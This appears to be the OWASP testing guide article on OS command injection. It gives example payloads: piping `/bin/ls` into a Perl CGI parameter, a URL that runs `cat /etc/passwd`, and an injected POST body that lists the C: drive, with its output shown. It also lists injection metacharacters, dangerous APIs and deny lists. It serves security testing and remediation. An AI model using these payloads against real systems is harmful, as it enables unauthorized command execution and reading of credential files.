# Testing for Command Injection

|ID          |
|------------|
|WSTG-INPV-12|

## Summary

This article describes how to test an application for OS command injection. The tester will try to inject an OS command through an HTTP request to the application.

OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.

## Test Objectives

- Identify and assess the command injection points.

## How to Test

When viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol `|` onto the end of the filename.

Example URL before alteration:

`http://sensitive/cgi-bin/userData.pl?doc=user1.txt`

Example URL modified:

`http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|`

This will execute the command `/bin/ls`.

Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. `%3B` is URL encoded and decodes to semicolon

Example:

`http://sensitive/something.php?dir=%3Bcat%20/etc/passwd`

### Example

Consider the case of an application that contains a set of documents that you can browse from the Internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following (`http://www.example.com/public/doc`):

```txt
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf
```

In this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following (`http://www.example.com/public/doc`):

```txt
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf+|+Dir c:\
```

If the application doesn't validate the request, we can obtain the following result:

```txt
    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
    Output...
    Il volume nell'unità C non ha etichetta.
    Numero di serie Del volume: 8E3F-4B61
    Directory of c:\
     18/10/2006 00:27 2,675 Dir_Prog.txt
     18/10/2006 00:28 3,887 Dir_ProgFile.txt
     16/11/2006 10:43
        Doc
        11/11/2006 17:25
           Documents and Settings
           25/10/2006 03:11
              I386
              14/11/2006 18:51
             h4ck3r
             30/09/2005 21:40 25,934
            OWASP1.JPG
            03/11/2006 18:29
                Prog
                18/11/2006 11:20
                    Program Files
                    16/11/2006 21:12
                        Software
                        24/10/2006 18:25
                            Setup
                            24/10/2006 23:37
                                Technologies
                                18/11/2006 11:14
                                3 File 32,496 byte
                                13 Directory 6,921,269,248 byte disponibili
                                Return code: 0
```

In this case, we have successfully performed an OS injection attack.

## Special Characters for Comand Injection

The following special character can be used for command injection such as `|` `;` `&` `$` `>` `<` `'` `!`

- `cmd1|cmd2` : Uses of `|` will make command 2 to be executed whether command 1 execution is successful or not.
- `cmd1;cmd2` : Uses of `;` will make command 2 to be executed whether command 1 execution is successful or not.
- `cmd1||cmd2` : Command 2 will only be executed if command 1 execution fails.
- `cmd1&&cmd2` : Command 2 will only be executed if command 1 execution succeeds.
- `$(cmd)` : For example, `echo $(whoami)` or `$(touch test.sh; echo 'ls' > test.sh)`
- `cmd` : It's used to execute a specific command. For example, `whoami`
- `>(cmd)`: `>(ls)`
- `<(cmd)`: `<(ls)`

## Code Review Dangerous API

Be aware of the uses of following API as it may introduce the command injection risks.

### Java

- `Runtime.exec()`

### C/C++

- `system`
- `exec`
- `ShellExecute`

### Python

- `exec`
- `eval`
- `os.system`
- `os.popen`
- `subprocess.popen`
- `subprocess.call`

### PHP

- `system`
- `shell_exec`
- `exec`
- `proc_open`
- `eval`

## Remediation

### Sanitization

The URL and form data needs to be sanitized for invalid characters. A deny list of characters is an option but it may be difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet. An allow list containing only allowable characters or command list should be created to validate the user input. Characters that were missed, as well as undiscovered threats, should be eliminated by this list.

General deny list to be included for command injection can be `|` `;` `&` `$` `>` `<` `'` `\` `!` `>>` `#`

Escape or filter special characters for windows,   `(` `)` `<` `>` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `^` `~` `!` `.` `"` `%` `@` `/` `\` `:` `+` `,`  ``` ` ```
Escape or filter special characters for Linux, `{` `}` `(` `)` `>` `<` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `$` `–` `#` `~` `!` `.` `"` `%`  `/` `\` `:` `+` `,` ``` ` ```

### Permissions

The web application and its components should be running under strict permissions that do not allow operating system command execution. Try to verify all this information to test from a gray-box testing point of view.

## Tools

- OWASP [WebGoat](https://owasp.org/www-project-webgoat/)
- [Commix](https://github.com/commixproject/commix)

## References

- [Penetration Testing for Web Applications (Part Two)](https://www.symantec.com/connect/articles/penetration-testing-web-applications-part-two)
- [OS Commanding](http://projects.webappsec.org/w/page/13246950/OS%20Commanding)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
- [ENV33-C. Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)
